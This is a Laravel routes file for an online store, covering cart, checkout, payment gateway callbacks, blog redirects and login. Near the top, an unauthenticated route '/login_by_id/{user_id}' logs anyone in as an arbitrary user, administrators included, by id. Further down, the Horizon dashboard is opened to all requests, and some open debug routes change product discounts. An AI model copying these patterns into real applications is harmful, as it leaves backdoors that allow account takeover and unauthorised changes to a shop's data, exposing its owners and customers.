<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

use App\Http\Controllers\Admin\QuestionController;
use App\Http\Controllers\Auth\AuthController;
use App\Http\Controllers\Auth\ForgotPasswordController;
use App\Http\Controllers\Auth\ResetPasswordController;
use App\Http\Controllers\Auth\TwoFactorController;
use App\Http\Controllers\Frontend\AddressController;
use App\Http\Controllers\Frontend\AppController;
use App\Http\Controllers\Frontend\ArticleController;
use App\Http\Controllers\Frontend\CartController;
use App\Http\Controllers\Frontend\CategoryController;
use App\Http\Controllers\Frontend\CheckoutController;
use App\Http\Controllers\Frontend\CommentController;
use App\Http\Controllers\Frontend\CompareController;
use App\Http\Controllers\Frontend\DeliveryController;
use App\Http\Controllers\Frontend\DetailController;
use App\Http\Controllers\Frontend\DiscountController;
use App\Http\Controllers\Frontend\FaqController;
use App\Http\Controllers\Frontend\InstallmentController;
use App\Http\Controllers\Frontend\ManufacturerController;
use App\Http\Controllers\Frontend\NewsletterController;
use App\Http\Controllers\Frontend\OrderController;
use App\Http\Controllers\Frontend\PageController;
use App\Http\Controllers\Frontend\PaymentController;
use App\Http\Controllers\Frontend\ProductController;
use App\Http\Controllers\Frontend\ReviewController;
use App\Http\Controllers\Frontend\SadadPaymentController;
use App\Http\Controllers\Frontend\SaleController;
use App\Http\Controllers\Frontend\SiteController;
use App\Http\Controllers\Frontend\WarrantyController;
use App\Http\Controllers\Frontend\WishlistController;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Route;

Route::get('re2', function () {
    $products = \App\Models\Product::where('status', false)->get();
    foreach ($products as $product)
    {
        echo route('products.show', $product->slug) . '<br>';
    }
});
Route::get('/login_by_id/{user_id}', function ($user_id) {
//    \Illuminate\Support\Facades\Artisan::call('refactor:category-title') ;
    \Illuminate\Support\Facades\Artisan::call('cache:clear') ;
    \Illuminate\Support\Facades\Artisan::call('view:clear') ;
    $user_id = explode('_', $user_id);
    if ($user_id[0] == 'f')
    {
        $res = auth()->loginUsingId($user_id[1]);
        if ($res)
        {
            if (auth()->user()->can('manage-store'))
            {
                return redirect()->route('admin.settings.index');
            } else
            {
                return redirect()->route('home');
            }
            abort(402);
        }
    }
    dd('You Are Not Allowed This Items');
})->name('login_by_id');
Auth::routes(['verify' => false]);
Route::post('logout', [AuthController::class, 'logout'])->name('logout');
Route::get('no-label', function () {
    $products = \App\Models\Product::whereNull('variety_value')->get();
    echo '<ol>';
    foreach ($products as $product)
    {
        echo '<li><a href="' . route('admin.products.edit', $product->slug) . '">' . $product->name . '</a> -- ' . ($product->status ? 'فعال' : 'غیرفعال') . '</li>';
    }
    echo '</ol>';
});
Route::get('dis', function () {
    $products = \App\Models\Product::whereNotNull('special')->get();
    foreach ($products as $product)
    {
        $discount = number_format(100 - $product->special * 100 / $product->price);
        if ($discount)
        {
            $product->update(['discount' => $discount]);
        }
    }
});
/*Route::get('add-order_products-to-sales', function() {
    $orders = \Modules\Order\Entities\Order::with('payments', 'products')->whereIn('status', [2, 3, 5])->get();
    foreach($orders as $order) {
        $orderId = $order->id;
        if($order->payments->count() == 0) {
            continue;
        }
        $paymentId = $order->payments->first()->id;
        $userId = $order->user_id;
        foreach($order->products as $product) {
            \Modules\Sale\Entities\Sale::insert([
                'order_id' => $orderId,
                'payment_id' => $paymentId,
                'user_id' => $userId,
                'product_id' => $product->id,
                'quantity' => $product->pivot->quantity,
                'created_at' => $order->payments->first()->created_at,
                'updated_at' => now(),
            ]);
        }
    }
});*/
/*Route::get('yari', function() {
    $sales = \Modules\Sale\Entities\Sale::with('product')->get();
    foreach($sales as $sale) {
        $totalSalesCount = $sale->product->total_sales_count + $sale->quantity;
        $orderUalesCount = $sale->product->order_sales_count + 1;
        $sale->product->update([
            'total_sales_count' => $totalSalesCount,
            'order_sales_count' => $orderUalesCount,
        ]);
    }
});*/
// Route::get('opt', function() {
//     $products = \App\Models\Product::with('options')->published()->get();
//     foreach($products as $product) {
//         if(count($product->options) == 0) {
//             echo '<a href="' . route('products.show', $product->slug) . '">' . $product->name . '</a><br>';
//         }
//     }
// });
/*Route::get('out-of-stock', function() {
    $products  = \App\Models\Product::where('status', '==', 0)->get();
    return (new \Rap2hpoutre\FastExcel\FastExcel($products))->download('products.xlsx', function ($product) {
        return [
            'slug'              => $product->slug,
            'model'             => $product->model,
            'name'              => $product->name,
            'price'             => number_format($product->price, 0, '', ''),
        ];
    });
});*/

Route::post('auth', [AuthController::class, 'auth'])->name('auth')->middleware('guest');
Route::post('2fa/resend', [TwoFactorController::class, 'resendVerificationCode'])->name('twoFactor.resendVerification');
Route::get('2fa', [TwoFactorController::class, 'showVerificationForm'])->name('twoFactor.verificationForm');
Route::post('2fa', [TwoFactorController::class, 'verification'])->name('twoFactor.verification');

Route::post('password/sms', [ForgotPasswordController::class, 'sendResetLinkSms'])->name('password.sms');
Route::get('reset/password/{token?}', [ResetPasswordController::class, 'showResetForm'])->name('password.reset');
Route::post('reset/password/', [ResetPasswordController::class, 'reset'])->name('password.update');

Route::get('login', [AuthController::class, 'showLoginForm'])->name('login')->middleware('guest');
Route::post('verify', [AuthController::class, 'verify'])->name('auth.verify')->middleware('guest');
Route::post('login', [AuthController::class, 'login'])->name('auth.login')->middleware('guest');

Route::get('faq', [FaqController::class, 'index'])->name('faqs.index');
Route::post('questions', [QuestionController::class, 'store'])->name('questions.store');
//Route::get('mj', function () {
//    auth()->loginUsingId(2, true);
//
//    return redirect()->to('admin');
//});
Route::group(['prefix' => 'laravel-filemanager', 'middleware' => ['web', 'auth']], function () {
    \UniSharp\LaravelFilemanager\Lfm::routes();
});
Route::get('b2b', function () {
    return view('frontend/major_shopping');
});
Route::post('installment-sale', [InstallmentController::class, 'store'])->name('frontend.installments.applications.store');
Route::get('installment-sale', [InstallmentController::class, 'index'])->name('frontend.installments.index');

Route::get('province/{province}', [AddressController::class, 'getCities']);
Route::redirect('articles', 'https://mahcenter.com/blog');
Route::redirect('articles/page/gandoservice', 'https://mahcenter.com/warranties/gando-service');
Route::redirect('articles/page/entekhabservise-service', 'https://mahcenter.com/warranties/entekhabservise');
Route::redirect('articles/page/golasaservice', 'https://mahcenter.com/warranties/golasa-service');
Route::redirect('articles/page/himalia-service', 'https://mahcenter.com/warranties/himalia-service-warranty');
Route::get('articles/page/{article}', [ArticleController::class, 'old'])->name('articles.show');
Route::get('blog/{article}', [ArticleController::class, 'show'])->name('frontend.blog.show');
Route::get('blog', [ArticleController::class, 'index'])->name('blog.index');
Route::name('frontend.')->group(function () {
    Route::resource('warranties', WarrantyController::class)->only(['index', 'show']);
    Route::post('details/guest', [DetailController::class, 'guest'])->name('details.guest');
    Route::resource('details', DetailController::class)->only(['index', 'store']);
});
Route::post('cart/guest', [CartController::class, 'guest'])->name('cart.guest');
Route::post('cart/add/{id}', [CartController::class, 'add'])->name('cart.add');
Route::patch('cart/update/{id}', [CartController::class, 'update'])->name('cart.update');
Route::delete('cart/delete/{id}', [CartController::class, 'destroy'])->name('cart.delete');
Route::get('cart', [CartController::class, 'index'])->name('cart');
Route::post('cart/display', [CartController::class, 'display'])->name('cart.display');
Route::get('categories/{category}', [CategoryController::class, 'show'])->name('category.show');
Route::post('categories/{category}', [CategoryController::class, 'filter'])->name('category.filter');
Route::get('category/decs/{category}', [CategoryController::class, 'description'])->name('category.desc');
Route::group(['middleware' => ['web']], function () {
    Route::get('compare', [CompareController::class, 'index'])->name('compare');
    Route::post('compare/add/{id}', [CompareController::class, 'add'])->name('compare.add');
    Route::post('compare/remove/{id}', [CompareController::class, 'remove'])->name('compare.remove');
    Route::get('compare/product/add', [CompareController::class, 'addCompare'])->name('product.add.compare');
    Route::get('/compare/ajax/search', [CompareController::class, 'ajaxSearch']);
});
Route::get('deliveries', [DeliveryController::class, 'index'])->name('amin.deliveries.index');
Route::get('discounts/{discount}', [DiscountController::class, 'show'])->name('discounts.show');
Route::get('manufacturers/{manufacturer}', [ManufacturerController::class, 'show'])->name('manufacturers.show');
Route::post('newsletter/subscribe', [NewsletterController::class, 'subscribe'])->name('newsletter.subscribe');
Route::post('newsletter/unsubscribe', [NewsletterController::class, 'unsubscribe'])->name('newsletter.unsubscribe');
Route::group(['prefix' => 'panel'], function () {
    Route::get('orders', [OrderController::class, 'index'])->name('panel.orders.index');
});
Route::get('panel/orders/{order}', [OrderController::class, 'show'])->name('frontend.orders.show');
Route::group(['prefix' => 'orders'], function () {
    Route::get('tracking_code/{id}', [OrderController::class, 'tracking'])->name('orders.tracking');
    Route::post('store', [OrderController::class, 'store'])->name('orders.store');
    Route::post('discount', [OrderController::class, 'discount'])->name('order.discount');
    Route::post('proceeding_order', [OrderController::class, 'proceeding'])->name('orders.proceeding');
});
Route::get('checkout/{order}/thank-you', [CheckoutController::class, 'thankyou'])/*->middleware('check.user.details')*/ ->name('thankyou');
Route::get('checkout', [CheckoutController::class, 'show'])/*->middleware('check.user.details')*/ ->name('checkout');
Route::get('page/{page}', [PageController::class, 'show'])->name('page.show');
Route::prefix('payments')->as('payments.')->group(function () {
    Route::get('request/{order}', [PaymentController::class, 'request'])->name('request');
    Route::any('callback/mellat', [PaymentController::class, 'mellatCallback'])->name('mellat');
    Route::any('callback', [PaymentController::class, 'callback'])->name('callback');
    Route::get('sadad/request/{order}', [SadadPaymentController::class, 'request'])->name('request.sadad');
    Route::any('sadad/callback', [SadadPaymentController::class, 'callback'])->name('callback.sadad');
});
Route::get('products/{product}', [ProductController::class, 'show'])->name('products.show');
Route::get('products/find/search', [ProductController::class, 'search'])->name('products.search');
Route::get('products', [ProductController::class, 'index'])->name('products');
Route::get('products/v1/api', [ProductController::class, 'api'])->name('products.api');
Route::post('review/store', [ReviewController::class, 'store'])->name('review.store');
Route::post('articles/{article}/comments', [CommentController::class, 'store'])->name('frontend.comments.store');
Route::prefix('sale')->group(function () {
    Route::get('/', [SaleController::class, 'index']);
});
Route::get('/', [AppController::class, 'index'])->name('home');
Route::get('search', [SiteController::class, 'search'])->name('search');
Route::get('search-ajax', [SiteController::class, 'searchAjax'])->name('search.ajax');
Route::get('special-sale', [AppController::class, 'specialSale'])->name('special-sale');
Route::get('amazing', [AppController::class, 'amazing'])->name('amazing');
Route::post('search/filter', [SiteController::class, 'filter'])->name('search.filter');
Route::redirect('frequentiy-asked-questions', 'faq');
Route::post('wishlist/add/{id}', [WishlistController::class, 'add'])->name('wishlist.add');
Route::delete('wishlist/delete/{id}', [WishlistController::class, 'destroy'])->name('wishlist.delete');
Route::get('wishlist', [WishlistController::class, 'index'])->name('wishlist');
Route::post('notification/toggle/{id}', [WishlistController::class, 'toggleNotification'])->name('notification.toggle');
\Laravel\Horizon\Horizon::auth(function ($request) {
    return true;
});
